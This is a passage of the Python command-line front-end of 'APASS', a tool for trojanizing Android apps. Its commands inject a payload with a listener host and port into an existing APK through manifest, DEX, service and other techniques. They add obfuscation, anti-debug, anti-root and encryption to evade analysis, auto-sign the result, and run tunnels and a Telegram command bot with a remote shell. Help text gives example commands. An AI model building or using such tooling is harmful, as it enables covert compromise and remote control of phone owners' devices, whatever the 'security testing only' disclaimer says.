import asyncio
import click
import tracemalloc
import sys
import subprocess
import os
from functools import wraps
from pathlib import Path
import socket
import json
from rich.panel import Panel

IMPORT_SUCCESS = True
IMPORT_ERROR = None

try:
    from utils import (
        setup_logger, handle_exception, SecurityError,
        SecurityValidator, console, create_default_config,
        check_dependencies, install_dependency
    )
    from tunnel_setup import TunnelSetupManager
    from bot_handlers import start_bot, stop_bot, get_bot_status, process_shell_command
    from payload_manager import PayloadManager, UltimatePayloadManager
    from apk_signer import APKSigner
    from ml_manager import train_model, evaluate_model, export_model
    from reflection_manager import ReflectionManager
    from injection_manager import InjectionManager
    from hook_manager import HookManager
    from LogReportPro import ReportGenerator
except ImportError as e:
    IMPORT_SUCCESS = False
    IMPORT_ERROR = str(e)

logger = setup_logger('apass')
tracemalloc.start()

def display_banner():
    banner_text = """
██╗   ██╗███████╗██╗  ████████╗██╗  ██╗██████╗  ██████╗ ███╗   ██╗██╗   ██╗██╗  ██╗
██║   ██║╚════██║██║  ╚══██╔══╝██║  ██║██╔══██╗██╔═══██╗████╗  ██║╚██╗ ██╔╝╚██╗██╔╝
██║   ██║    ██╔╝██║     ██║   ███████║██████╔╝██║   ██║██╔██╗ ██║ ╚████╔╝  ╚███╔╝ 
╚██╗ ██╔╝   ██╔╝ ██║     ██║   ██╔══██║██╔══██╗██║   ██║██║╚██╗██║  ╚██╔╝   ██╔██╗ 
 ╚████╔╝    ██║  ███████╗██║   ██║  ██║██║  ██║╚██████╔╝██║ ╚████║   ██║   ██╔╝ ██╗
  ╚═══╝     ╚═╝  ╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝
"""
    banner_panel = Panel(banner_text,
                         title="[bold cyan]APASS - Advanced Payload APK Suite[/bold cyan]",
                         subtitle="[bold yellow]Created by v7lthronyx | V1.0[/bold yellow]",
                         style="magenta",
                         expand=False)
    console.print(banner_panel)

def async_command(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        return asyncio.run(f(*args, **kwargs))
    return wrapper

@click.group(context_settings=dict(
    help_option_names=['-h', '--help'],
    max_content_width=120,
    show_default=True
))
@click.version_option(version="1.0 beta", prog_name="APASS - Advanced Payload APK Suite")
def cli(ctx=None):
    if ctx is not None and ctx.invoked_subcommand is None:
        if not asyncio.run(validate_installation()):
            console.print("[red]Warning: Some components may not work properly[/red]")
            if not click.confirm("Continue anyway?", default=False):
                sys.exit(1)

@cli.group(help="Commands related to payload operations")
def payload():
    pass

@payload.command(name="create", help="Create a new payload APK with various options")
@click.argument("apk_path", type=click.Path(exists=True))
@click.option("--lhost", required=True, help="Listener host address")
@click.option("--lport", required=True, type=int, help="Listener port")
@click.option("--technique", "-t", multiple=True, default=["manifest", "dex"], help="Injection techniques to use")
@click.option("--dynamic-class", help="Name of dynamic class to generate")
@click.option("--dynamic-method", multiple=True, help="Method to add to dynamic class")
@click.option("--obfuscate", is_flag=True, help="Enable code obfuscation")
@click.option("--anti-debug", is_flag=True, help="Add anti-debugging protection")
@click.option("--anti-root", is_flag=True, help="Add root detection")
@click.option("--encryption", type=click.Choice(['aes', 'xor', 'rc4']), help="Encryption method")
@click.option("--compression", is_flag=True, help="Enable payload compression")
@click.option("--string-encrypt", is_flag=True, help="Enable string encryption")
@click.option("--flow-obfuscation", is_flag=True, help="Control flow obfuscation")
@click.option("--custom-lib", type=click.Path(exists=True), help="Path to custom native library")
@click.option("--output", "-o", type=click.Path(), help="Output APK path")
@click.option("--auto-sign", is_flag=True, help="Automatically sign the APK")
@async_command
async def create_payload(apk_path, lhost, lport, technique, dynamic_class, dynamic_method, 
                         obfuscate, anti_debug, anti_root, encryption, compression, 
                         string_encrypt, flow_obfuscation, custom_lib, output, auto_sign):
    try:
        console.print(f"[bold cyan]Creating payload for {apk_path}[/bold cyan]")
        techniques = list(technique)
        manager = UltimatePayloadManager(apk_path, lhost, lport)
        
        manager.set_protection_options(
            obfuscate=obfuscate,
            anti_debug=anti_debug,
            anti_root=anti_root,
            encryption=encryption,
            compression=compression,
            string_encrypt=string_encrypt,
            flow_obfuscation=flow_obfuscation
        )
        
        if output:
            manager.set_output_path(output)
        
        if custom_lib:
            manager.add_native_library(custom_lib)
        
        if dynamic_class and dynamic_method:
            reflection_mgr = ReflectionManager()
            methods = {}
            for method in dynamic_method:
                try:
                    name, code = method.split(":", 1)
                    methods[name] = code
                except ValueError:
                    logger.error(f"Invalid method format: {method}. Use name:code")
                    click.echo(f"[red]Error:[/red] Invalid method format: {method}. Use name:code")
                    return
            
            reflection_mgr.generate_dynamic_class(dynamic_class, methods)
            
        with console.status(f"[bold green]Injecting payload using techniques: {', '.join(techniques)}..."):
            result = await manager.inject_payload(techniques)
        
        if result:
            console.print(f"[green]✅ Payload created successfully![/green]")
            console.print(f"[bold]Techniques applied:[/bold] {', '.join(techniques)}")
            if dynamic_class:
                console.print(f"[bold]Dynamic class added:[/bold] {dynamic_class}")
            if obfuscate:
                console.print(f"[bold]Obfuscation:[/bold] Enabled")
            if encryption:
                console.print(f"[bold]Encryption:[/bold] {encryption}")
            console.print(f"[bold]Final APK output:[/bold] {result}")
            
            if auto_sign:
                console.print("[yellow]Auto-signing APK with debug keystore...[/yellow]")
                home_dir = Path.home()
                debug_keystore = home_dir / ".android" / "debug.keystore"
                
                if debug_keystore.exists():
                    signer = APKSigner(
                        apk_path=result,
                        keystore_path=str(debug_keystore),
                        keystore_password="android",
                        key_alias="androiddebugkey",
                        key_password="android"
                    )
                    
                    if await signer.sign_apk_secure():
                        console.print("[green]✅ APK signed successfully with debug keystore[/green]")
                    else:
                        console.print("[red]❌ Failed to sign APK with debug keystore[/red]")
                else:
                    console.print("[red]❌ Debug keystore not found. APK not signed.[/red]")
        else:
            console.print("[red]❌ Error creating Payload.[/red]")
    except SecurityError as e:
        logger.error(f"Security error: {e}")
        console.print(f"[red]Security error: {str(e)}[/red]")
    except Exception as e:
        handle_exception(e)

@payload.command(name="analyze", help="Analyze an existing APK for various characteristics")
@click.argument("apk_path", type=click.Path(exists=True))
@click.option("--deep", is_flag=True, help="Perform a deeper analysis")
@click.option("--scan", is_flag=True, help="Scan for malware content")
@click.option("--export", type=click.Path(), help="Path to export the analysis report")
@click.option("--memory", is_flag=True, help="Analyze memory behavior")
@click.option("--network", is_flag=True, help="Analyze network behavior")
@click.option("--behavior", is_flag=True, help="Analyze runtime behavior")
@click.option("--permissions", is_flag=True, help="Analyze app permissions")
@click.option("--json-output", is_flag=True, help="Output results in JSON format")
@async_command
async def analyze_payload(apk_path, deep, scan, export, memory, network, behavior, 
                         permissions, json_output):
    try:
        console.print(f"[bold cyan]Analyzing {apk_path}...[/bold cyan]")
        
        manager = PayloadManager(apk_path, "")
        analysis_options = {
            'deep': deep,
            'scan_malware': scan,
            'analyze_memory': memory,
            'analyze_network': network,
            'analyze_behavior': behavior,
            'analyze_permissions': permissions
        }
        
        with console.status("[bold green]Running analysis..."):
            result = await manager.analyze_apk(analysis_options)
        
        if result:
            if json_output:
                if export:
                    with open(export, 'w') as f:
                        json.dump(result, f, indent=2)
                    console.print(f"[green]Analysis report saved to {export}[/green]")
                else:
                    print(json.dumps(result, indent=2))
            else:
                console.print("[bold cyan]Analysis Results:[/bold cyan]")
                console.print(f"[bold]Package Name:[/bold] {result.get('package_name', 'Unknown')}")
                console.print(f"[bold]Version:[/bold] {result.get('version', 'Unknown')}")
                console.print(f"[bold]SDK Version:[/bold] {result.get('sdk_version', 'Unknown')}")
                
                console.print("\n[bold]Components:[/bold]")
                console.print(f"  Activities: {len(result.get('activities', []))}")
                console.print(f"  Services: {len(result.get('services', []))}")
                console.print(f"  Receivers: {len(result.get('receivers', []))}")
                console.print(f"  Providers: {len(result.get('providers', []))}")
                
                console.print(f"\n[bold]Permissions[/bold] ({len(result.get('permissions', []))}):")
                for perm in result.get('permissions', [])[:5]:
                    console.print(f"  - {perm}")
                if len(result.get('permissions', [])) > 5:
                    console.print(f"  ... and {len(result.get('permissions', []))} more")
                
                if result.get('malware_scan'):
                    risk_level = result['malware_scan'].get('risk_level', 'Unknown')
                    color = "green" if risk_level == "Low" else "yellow" if risk_level == "Medium" else "red"
                    console.print(f"\n[bold]Malware Scan:[/bold] [{color}]{risk_level}[/{color}]")
                
                if export:
                    with open(export, 'w') as f:
                        json.dump(result, f, indent=2)
                    console.print(f"\n[green]Full analysis report saved to {export}[/green]")
        else:
            console.print("[red]❌ Analysis failed.[/red]")
    except Exception as e:
        handle_exception(e)
        console.print(f"[red]Analysis error: {str(e)}[/red]")

@payload.command(name="list", help="List all active payloads with optional filtering")
@click.option("--filter", help="Filter payloads by technique or tag")
@click.option("--limit", type=int, default=10, help="Limit the number of results")
@click.option("--json-output", is_flag=True, help="Output results in JSON format")
@async_command
async def list_payloads(filter, limit, json_output):
    try:
        manager = PayloadManager("", "")
        payloads = await manager.list_payloads(filter, limit)
        
        if json_output:
            print(json.dumps(payloads, indent=2))
            return
            
        if payloads:
            console.print("[bold cyan]Active Payloads:[/bold cyan]")
            for i, payload in enumerate(payloads, 1):
                status = payload.get('status', 'unknown')
                status_color = "green" if status == "active" else "yellow" if status == "pending" else "red"
                
                console.print(f"[bold]{i}.[/bold] [bold]{payload.get('id')}[/bold] ({payload.get('created_at', 'Unknown')})")
                console.print(f"   Host: {payload.get('lhost')}:{payload.get('lport')}")
                console.print(f"   Techniques: {', '.join(payload.get('techniques', []))}")
                console.print(f"   Status: [{status_color}]{status}[/{status_color}]")
                console.print("")
        else:
            console.print("[yellow]No active payloads found.[/yellow]")
    except Exception as e:
        handle_exception(e)
        console.print(f"[red]Error listing payloads: {str(e)}[/red]")

@payload.command(name="train", help="Train a machine learning model with a custom dataset")
@click.option("--dataset", type=click.Path(exists=True), help="Path to custom dataset")
@click.option("--epochs", type=int, default=10, help="Number of training epochs")
@click.option("--batch-size", type=int, default=32, help="Batch size for training")
@click.option("--model-name", default="default_model", help="Name to save the model as")
@async_command 
async def train_ml_cmd(dataset, epochs, batch_size, model_name):
    try:
        console.print("[bold cyan]Starting model training...[/bold cyan]")
        with console.status("[bold green]Training model..."):
            result = await train_model(
                dataset_path=dataset,
                epochs=epochs,
                batch_size=batch_size,
                model_name=model_name
            )
        console.print("[green]✅ Model training complete![/green]")
        console.print(f"[bold]Results:[/bold]\n{result}")
    except Exception as e:
        console.print(f"[red]Training error: {e}[/red]")
        handle_exception(e)

@payload.command(name="evaluate", help="Evaluate a trained machine learning model")
@click.argument("model_path", type=click.Path(exists=True))
@click.option("--test-set", type=click.Path(exists=True), help="Path to test dataset")
@click.option("--detailed", is_flag=True, help="Show detailed evaluation metrics")
@async_command
async def evaluate_ml_model(model_path, test_set, detailed):
    try:
        console.print(f"[bold cyan]Evaluating model: {model_path}[/bold cyan]")
        with console.status("[bold green]Running evaluation..."):
            result = await evaluate_model(model_path, test_set, detailed)
        
        console.print("[green]✅ Model evaluation complete![/green]")
        
        if detailed:
            console.print("[bold]Detailed Metrics:[/bold]")
            console.print(f"Accuracy: {result['accuracy']:.4f}")
            console.print(f"Precision: {result['precision']:.4f}")
            console.print(f"Recall: {result['recall']:.4f}")
            console.print(f"F1 Score: {result['f1']:.4f}")
            console.print("\n[bold]Confusion Matrix:[/bold]")
            console.print(result['confusion_matrix'])
        else:
            console.print(f"[bold]Accuracy:[/bold] {result['accuracy']:.4f}")
            console.print(f"[bold]F1 Score:[/bold] {result['f1']:.4f}")
    except Exception as e:
        console.print(f"[red]Evaluation error: {e}[/red]")
        handle_exception(e)

@payload.command(name="export-model", help="Export a trained machine learning model to a different format")
@click.argument("model_path", type=click.Path(exists=True))
@click.argument("export_path", type=click.Path())
@click.option("--format", type=click.Choice(['onnx', 'tflite', 'pytorch']), default='onnx', help="Export format")
@async_command
async def export_ml_model(model_path, export_path, format):
    try:
        console.print(f"[bold cyan]Exporting model from {model_path} to {format} format[/bold cyan]")
        with console.status(f"[bold green]Exporting to {format}..."):
            result = await export_model(model_path, export_path, format)
        
        if result:
            console.print(f"[green]✅ Model successfully exported to {export_path}[/green]")
        else:
            console.print("[red]❌ Model export failed.[/red]")
    except Exception as e:
        console.print(f"[red]Export error: {e}[/red]")
        handle_exception(e)

@payload.command(name="analyze-ml", help="Analyze an APK using a machine learning model")
@click.argument("apk_path", type=click.Path(exists=True))
@click.option("--detect-heuristics", is_flag=True, help="Enable heuristic detection")
@async_command
async def analyze_ml(apk_path, detect_heuristics):
    try:
        manager = PayloadManager(apk_path, "")
        result = await manager.analyze_with_ml(apk_path, detect_heuristics=detect_heuristics)
        
        if result["result"] == "Error":
            click.echo(f"Analysis failed: {result['error']}")
            return

        click.echo(f"ML Analysis Results for {apk_path}:")
        click.echo(f"Classification: {result['result']}")
        click.echo(f"Confidence: {result['confidence']}")
        click.echo(f"Analyzed at: {result['analyzed_at']}")
        
    except Exception as e:
        click.echo(f"Analysis error: {e}")

@payload.command(name="remove", help="Remove an existing payload by its ID")
@click.argument("payload_id", type=str)
def remove_payload(payload_id):
    try:
        manager = PayloadManager("", "")
        if manager.remove_payload(payload_id):
            click.echo(f"Payload {payload_id} removed successfully.")
        else:
            click.echo(f"Failed to remove payload {payload_id}.")
    except Exception as e:
        click.echo(f"Error removing payload: {str(e)}")

@payload.command(name="validate-techniques", help="Validate all available injection techniques")
@async_command
async def validate_techniques_cmd():
    try:
        manager = PayloadManager("", "")
        results = await manager.validate_all_techniques()
        
        console.print("[bold cyan]Technique Validation Results:[/bold cyan]")
        for technique, result in results.items():
            status = "Passed" if result else "Failed"
            color = "green" if result else "red"
            console.print(f"[bold]{technique}:[/bold] [{color}]{status}[/{color}]")
    except Exception as e:
        handle_exception(e)
        console.print(f"[red]Validation error: {str(e)}[/red]")

@payload.command(name="validate", help="Validate the payload configuration")
@async_command
async def validate_payload():
    try:
        console.print("[bold cyan]Validating payload configuration...[/bold cyan]")
        manager = PayloadManager("", "")
        validation_results = await manager.validate_payload_configuration()
        
        if validation_results['valid']:
            console.print("[green]✅ Payload configuration is valid.[/green]")
        else:
            console.print("[red]❌ Payload configuration is invalid.[/red]")
            for error in validation_results['errors']:
                console.print(f"[red]Error:[/red] {error}")
    except Exception as e:
        handle_exception(e)
        console.print(f"[red]Validation error: {str(e)}[/red]")

@payload.command(name="message", help="Handle messages from payloads")
@click.argument("payload_id", type=str)
@click.argument("message", type=str)
@async_command
async def payload_message(payload_id, message):
    try:
        manager = PayloadManager("", "")
        result = await manager.handle_payload_message(payload_id, message)
        if result:
            console.print(f"[green]Message from payload {payload_id} handled successfully.[/green]")
        else:
            console.print(f"[red]Failed to handle message from payload {payload_id}.[/red]")
    except Exception as e:
        handle_exception(e)
        console.print(f"[red]Error handling message from payload: {str(e)}[/red]")

@payload.command(name="batch-operation", help="Execute batch operations from a JSON file")
@click.argument("operations_file", type=click.Path(exists=True))
@async_command
async def batch_operation_cmd(operations_file):
    try:
        with open(operations_file, 'r') as f:
            operations_list = json.load(f)
        
        manager = HookManager()
        result = await manager.batch_operation(operations_list)
        
        console.print("[bold cyan]Batch Operation Results:[/bold cyan]")
        console.print(f"[green]Successful operations: {len(result['successful'])}[/green]")
        console.print(f"[red]Failed operations: {len(result['failed'])}[/red]")
        
        if result['failed']:
            console.print("[bold red]Failed Operations Details:[/bold red]")
            for failure in result['failed']:
                console.print(f"[red]Operation: {failure['operation']}[/red]")
                console.print(f"[red]Class: {failure['class_name']}[/red]")
                console.print(f"[red]Method: {failure['method_name']}[/red]")
                console.print(f"[red]Error: {failure['error']}[/red]")
    except Exception as e:
        handle_exception(e)
        console.print(f"[red]Batch operation error: {str(e)}[/red]")

@payload.command(name="scan", help="Perform an advanced vulnerability scan on an APK")
@click.argument("apk_path", type=click.Path(exists=True))
@click.option("--output", "-o", type=click.Path(), help="Output path for the scan report")
@click.option("--advanced-scan", is_flag=True, help="Perform an advanced vulnerability scan")
@click.option("--sast", is_flag=True, help="Enable static application security testing (SAST)")
@click.option("--dast", is_flag=True, help="Enable dynamic application security testing (DAST)")
@click.option("--report", type=click.Path(), help="Path to save the scan report")
@async_command
async def scan_payload(apk_path, output, advanced_scan, sast, dast, report):
    try:
        console.print(f"[bold cyan]Scanning {apk_path} for vulnerabilities...[/bold cyan]")
        manager = PayloadManager(apk_path, "")
        
        with console.status("[bold green]Running vulnerability scan..."):
            if advanced_scan:
                result = await manager.advanced_vulnerability_scan(sast=sast, dast=dast)
            else:
                result = await manager.basic_vulnerability_scan()
        
        if result:
            console.print("[green]✅ Vulnerability scan completed successfully![/green]")
            if output:
                with open(output, 'w') as f:
                    json.dump(result, f, indent=2)
                console.print(f"[green]Scan report saved to {output}[/green]")
            else:
                console.print(json.dumps(result, indent=2))
        else:
            console.print("[red]❌ Vulnerability scan failed.[/red]")
    except Exception as e:
        handle_exception(e)
        console.print(f"[red]Scan error: {str(e)}[/red]")

@cli.group(help="Commands related to tunnel management")
def tunnel():
    pass

@tunnel.command(name="setup", help="Setup a new tunnel configuration")
@async_command
async def setup_tunnel():
    manager = TunnelSetupManager()
    try:
        await manager.setup_tunnel()
        click.echo("Tunnel successfully configured.")
    except Exception as e:
        click.echo(f"Error configuring Tunnel: {str(e)}")

@tunnel.command(name="start", help="Start a tunnel service on a specified port")
@click.argument("service")
@click.argument("port", type=int)
@click.option("--region", default=None, help="Region for the tunnel service")
@click.option("--hostname", default=None, help="Hostname for the tunnel service")
@async_command
async def start_tunnel(service, port, region, hostname):
    manager = TunnelSetupManager()
    try:
        await manager.start_tunnel(service, port, region, hostname)
        click.echo(f"Service {service} started on port {port}.")
    except Exception as e:
        handle_exception(e)

@tunnel.command(name="stop", help="Stop a running tunnel service")
@click.argument("service")
@async_command
async def stop_tunnel(service):
    manager = TunnelSetupManager()
    try:
        await manager.stop_tunnel(service)
        click.echo(f"Service {service} stopped.")
    except Exception as e:
        handle_exception(e)

@cli.group(help="Commands related to bot management")
def bot():
    pass

@bot.command(name="start", help="Start the bot service")
@async_command
async def start_bot_cmd():
    try:
        await start_bot()
        click.echo("Bot successfully started.")
    except Exception as e:
        click.echo(f"Error starting bot: {str(e)}")

@bot.command(name="stop", help="Stop the bot service")
@async_command
async def stop_bot_cmd():
    try:
        result = await stop_bot()
        if result:
            console.print("[green]✅ Bot successfully stopped.[/green]")
        else:
            console.print("[yellow]Bot was not running or failed to stop.[/yellow]")
    except Exception as e:
        console.print(f"[red]Error stopping bot: {str(e)}[/red]")
        handle_exception(e)

@bot.command(name="status", help="Get the current status of the bot service")
@async_command
async def status_bot_cmd():
    try:
        status = await get_bot_status()
        if status['running']:
            console.print("[green]✅ Bot is currently running.[/green]")
            console.print(f"[bold]Uptime:[/bold] {status['uptime']}")
            console.print(f"[bold]Active sessions:[/bold] {status['active_sessions']}")
            console.print(f"[bold]Messages processed:[/bold] {status['messages_processed']}")
        else:
            console.print("[yellow]Bot is not running.[/yellow]")
    except Exception as e:
        console.print(f"[red]Error getting bot status: {str(e)}[/red]")
        handle_exception(e)

@bot.command(name="shell", help="Start an interactive shell for the bot")
@async_command
async def bot_shell_cmd():
    try:
        console.print("[bold cyan]Starting interactive bot shell...[/bold cyan]")
        console.print("[yellow]Type 'exit' to quit the shell.[/yellow]")
        
        while True:
            cmd = click.prompt("bot shell", prompt_suffix="> ")
            if cmd.lower() == "exit":
                break
                
            response = await process_shell_command(cmd)
            console.print(response)
            
    except KeyboardInterrupt:
        console.print("[yellow]Shell terminated.[/yellow]")
    except Exception as e:
        console.print(f"[red]Shell error: {str(e)}[/red]")
        handle_exception(e)

@bot.command(name="monitor", help="Monitor bot activity for a specified duration")
@click.option("--duration", type=int, default=60, help="Duration in seconds to monitor")
@click.option("--log-file", type=click.Path(), help="Log file path")
@async_command
async def monitor_bot_cmd(duration, log_file):
    try:
        console.print(f"[bold cyan]Monitoring bot activity for {duration} seconds...[/bold cyan]")
        
        from bot_handlers import monitor_bot_activity
        with console.status("[bold green]Monitoring..."):
            activity = await monitor_bot_activity(duration)
        
        console.print("[bold]Bot Activity Report:[/bold]")
        console.print(f"[bold]Commands processed:[/bold] {activity['commands_processed']}")
        console.print(f"[bold]Messages received:[/bold] {activity['messages_received']}")
        console.print(f"[bold]Errors:[/bold] {activity['errors']}")
        console.print(f"[bold]Active users:[/bold] {activity['active_users']}")
        
        if log_file:
            with open(log_file, 'w') as f:
                json.dump(activity, f, indent=2)
            console.print(f"[green]Activity log saved to {log_file}[/green]")
            
    except Exception as e:
        console.print(f"[red]Monitoring error: {str(e)}[/red]")
        handle_exception(e)

@cli.command(name="help", help="Show detailed help instructions")
@click.pass_context 
def show_help(ctx):
    from rich.markdown import Markdown
    from rich.table import Table
    commands = cli.list_commands(ctx)
    command_list = ', '.join(sorted(commands))
    
    help_text = f"""# APASS - Advanced Payload APK Suite v1.0 beta

## 🚀 Quick Start Guide

1. Create a basic payload:
```
apass payload create app.apk --lhost 127.0.0.1 --lport 4444
```

## 📚 Main Features & Commands

### Payload Operations

- **Create Payload:**
  ```
  apass payload create [OPTIONS] APK_PATH
  ```
  - `--lhost HOST`         Target listener host
  - `--lport PORT`         Target listener port  
  - `--technique, -t`      Injection techniques to use:
    - `manifest`        - AndroidManifest.xml injection
    - `dex`            - DEX code injection 
    - `resource`       - Resource file injection
    - `lib`            - Native library injection
    - `memory`         - Runtime memory injection
    - `service`        - Service component injection
    - `broadcast`      - Broadcast receiver injection
    - `webview`        - WebView JavaScript injection
    - `database`       - SQLite database injection
    - `ipc`            - IPC/Binder injection
    - `network`        - Network traffic injection
  
  - **Protection Options:**
    - `--obfuscate`         Enable code obfuscation
    - `--anti-debug`        Add anti-debugging 
    - `--anti-root`         Add root detection
    - `--encryption`        Encryption method [aes/xor/rc4]
    - `--compression`       Enable payload compression
    - `--string-encrypt`    Enable string encryption
    - `--flow-obfuscation`  Control flow obfuscation
  
  - **Advanced Options:**  
    - `--hook`             Add runtime method hooks
    - `--reflection`       Enable dynamic code loading
    - `--native-lib`       Add custom native library 
    - `--jni-bridge`       Create JNI bridge
    - `--dex-loader`       Custom DEX class loader
    - `--permissions`      Add custom permissions

  **Examples:**
  - Basic payload with default techniques:
    ```
    apass payload create target.apk --lhost 192.168.1.10 --lport 4444
    ```
  - Advanced payload with multiple techniques:
    ```
    apass payload create target.apk --lhost 10.0.0.5 --lport 8080 -t dex -t manifest -t service --obfuscate --anti-debug --encryption aes
    ```
  - Creating payload with custom dynamic class:
    ```
    apass payload create target.apk --lhost 192.168.0.5 --lport 9090 --dynamic-class PayloadExecutor --dynamic-method "run:System.out.println(\"Executed\");"
    ```

- **Analyze Payload:**
  ```
  apass payload analyze APK_PATH [OPTIONS]
  ```
  - `--deep`            Deep static analysis
  - `--scan`            Malware scanning
  - `--ml`              ML-based analysis
  - `--memory`          Memory behavior analysis  
  - `--network`         Network traffic analysis
  - `--behavior`        Runtime behavior analysis
  - `--export PATH`     Save analysis report
  
  **Examples:**
  - Basic analysis:
    ```
    apass payload analyze suspect.apk
    ```
  - Deep analysis with malware scanning:
    ```
    apass payload analyze suspect.apk --deep --scan
    ```
  - Export analysis results:
    ```
    apass payload analyze suspect.apk --deep --scan --network --export /home/user/analysis_report.json
    ```

- **ML Operations:**
  - `apass payload train`              Train ML model
  - `apass payload evaluate MODEL`     Evaluate trained model
  - `apass payload export-model MODEL` Export model to different format
  - `apass payload analyze-ml APP`     ML-based analysis
  - `apass payload list`               List active payloads
  - `apass payload remove ID`          Remove a payload
  - `apass payload validate-techniques` Validate injection techniques

  **Examples:**
  - Train model with custom dataset:
    ```
    apass payload train --dataset /home/user/dataset --epochs 20 --model-name malware_detector
    ```
  - Evaluate model:
    ```
    apass payload evaluate /home/user/models/malware_model.pkl --detailed
    ```
  - Export model to ONNX format:
    ```
    apass payload export-model /home/user/models/malware_model.pkl /home/user/exported/model.onnx --format onnx
    ```
  - List active payloads:
    ```
    apass payload list --limit 5
    ```
  - Validate techniques:
    ```
    apass payload validate-techniques
    ```

### Tunnel Management

- **Setup tunnel:**
  - `apass tunnel setup`               Configure tunnel service
  - `apass tunnel start SERVICE PORT`  Start tunnel service
  - `apass tunnel stop SERVICE`        Stop tunnel service

  - **Options:**
    - `--region`          Tunnel region
    - `--hostname`        Custom hostname
    - `--protocol`        [tcp/http] Protocol
    - `--auth`            Enable authentication  
    - `--monitor`         Enable monitoring
    - `--cert`           Custom certificate
    - `--compress`        Enable compression

  **Examples:**
  - Setup a new tunnel:
    ```
    apass tunnel setup
    ```
  - Start HTTP tunnel:
    ```
    apass tunnel start http 8080 --region us-east
    ```
  - Start TCP tunnel with custom hostname:
    ```
    apass tunnel start tcp 4444 --hostname my-custom-hostname.example.com
    ```
  - Stop running service:
    ```
    apass tunnel stop http
    ```

### Bot Control

- **Telegram bot:**
  - `apass bot start`      Start bot
  - `apass bot stop`       Stop bot
  - `apass bot status`     Show status
  - `apass bot shell`      Interactive shell
  - `apass bot monitor`    Activity monitoring

  **Examples:**
  - Start the command bot:
    ```
    apass bot start
    ```
  - Check bot status:
    ```
    apass bot status
    ```
  - Monitor bot activity for 2 minutes:
    ```
    apass bot monitor --duration 120 --log-file bot_activity.json
    ```
  - Enter interactive shell:
    ```
    apass bot shell
    ```

### APK Tools

- **Sign APK:**
  ```
  apass apk sign APK KEYSTORE [OPTIONS]
  ```
  - `--ks-pass`         Keystore password
  - `--key-alias`       Key alias
  - `--key-pass`        Key password
  - `--proguard`        Enable ProGuard
  - `--r8`              Use R8 optimizer
  - `--proguard-rule`   Add custom ProGuard rule
  - `--align`           Zipalign APK
  - `--verify`          Verify after signing

- **Verify APK:**
  ```
  apass apk verify APK
  ```
  - `--cert-info`       Show certificate
  - `--check-integrity` Verify integrity

  **Examples:**
  - Sign APK with debug keystore:
    ```
    apass apk sign app.apk ~/.android/debug.keystore --key-alias androiddebugkey
    ```
  - Sign APK with optimization:
    ```
    apass apk sign app.apk keystore.jks --key-alias release_key --proguard
    ```
  - Sign with custom ProGuard rules:
    ```
    apass apk sign app.apk keystore.jks --key-alias release_key --proguard --proguard-rule "keep.rules" --proguard-rule "obfuscate.rules"
    ```
  - Verify APK signature:
    ```
    apass apk verify signed_app.apk
    ```

### Hook Management

- **Batch operations:**
  ```
  apass hook batch-operation OPERATIONS_FILE
  ```

  **Examples:**
  - Execute batch operations from JSON file:
    ```
    apass hook batch-operation /home/user/hooks/operations.json
    ```
  - Example operations.json content:
    ```
    {{
      "operations": [
        {{
          "class_name": "com.example.CryptoHandler",
          "method_name": "decrypt",
          "operation": "log_calls"
        }},
        {{
          "class_name": "com.example.NetworkManager",
          "method_name": "sendData",
          "operation": "intercept"
        }}
      ]
    }}
    ```

### Utility Commands

- `apass install-deps`                Install missing dependencies
- `apass generate-summary`            Generate summary report
- `apass register-dependency`         Register a dependency
- `apass inject-dependencies`         Inject dependencies
- `--version`                         Display version information

  **Examples:**
  - Install missing dependencies:
    ```
    apass install-deps
    ```
  - Generate summary report:
    ```
    apass generate-summary --config summary_config.json
    ```
  - Register a dependency:
    ```
    apass register-dependency crypto /path/to/crypto_module.py --lazy
    ```
  - Inject dependencies:
    ```
    apass inject-dependencies PayloadManager
    ```

## 🔒 Key Features

- **Protection:**
  - Advanced code & resource obfuscation
  - Anti-analysis & anti-debug
  - Multi-layer encryption
  - Native code protection
  - Runtime integrity checks

- **Performance:**
  - ProGuard/R8 optimization  
  - Resource optimization
  - Startup optimization
  - Memory optimization
  - Battery optimization

- **Security:**
  - Input validation
  - Access control
  - Rate limiting
  - Session management
  - Token validation

- **Monitoring:**
  - Comprehensive logging
  - Activity monitoring
  - Performance metrics
  - ML analysis
  - Network monitoring

## ⚠️ Usage Guidelines

- For security testing only
- Follow responsible disclosure
- Comply with applicable laws
- Do not use maliciously

For detailed help on any command, run: `apass COMMAND --help`
"""
    from utils import console
    console.print(Markdown(help_text))

    ctx.info_name = 'apass'
    click.echo("\nDetailed Command List:")
    for cmd_name in sorted(commands):
        cmd = cli.get_command(ctx, cmd_name)
        if cmd:
            help_text = cmd.get_help(ctx).split('\n')[0]
            click.echo(f"  {cmd_name:<20} {help_text}")

@cli.group(help="Commands related to APK management")
def apk():
    pass

@apk.command(name="sign", help="Sign an APK with a specified keystore")
@click.argument("apk_path", type=click.Path(exists=True))
@click.argument("keystore_path", type=click.Path(exists=True))
@click.option("--ks-pass", prompt=True, hide_input=True,
              confirmation_prompt=False, help="Keystore password")
@click.option("--key-alias", prompt=True, hide_input=False, help="Key alias name")
@click.option("--key-pass", prompt=True, hide_input=True,
              confirmation_prompt=False, help="Key password")
@click.option("--proguard", is_flag=True, help="Enable ProGuard optimization")
@click.option("--r8", is_flag=True, help="Use R8 instead of ProGuard")
@click.option("--proguard-rule", multiple=True, help="Add custom ProGuard rule")
@click.option("--align", is_flag=True, help="Perform zipalign")
@click.option("--verify", is_flag=True, help="Verify after signing")
@async_command
async def sign_apk(apk_path, keystore_path, ks_pass, key_alias, key_pass, proguard, r8, proguard_rule, align, verify):
    try:
        console.print(f"[bold cyan]Signing APK: {apk_path}[/bold cyan]")
        signer = APKSigner(
            apk_path=apk_path,
            keystore_path=keystore_path,
            keystore_password=ks_pass,
            key_alias=key_alias,
            key_password=key_pass
        )
        
        if proguard or r8:
            console.print("[yellow]Applying code optimization...[/yellow]")
            signer.proguard_enabled = True
            signer.r8_enabled = r8
            signer.proguard_rules.extend(proguard_rule)
            
        if align:
            console.print("[yellow]Performing zipalign...[/yellow]")
            await signer.zipalign()
            
        if await signer.sign_apk_secure():
            console.print("[green]✅ APK signed successfully![/green]")
            if verify:
                console.print("[yellow]Verifying signature...[/yellow]")
                if await signer.verify_signature():
                    console.print("[green]✅ Signature verified[/green]")
                else:
                    console.print("[red]❌ Signature verification failed[/red]")
        else:
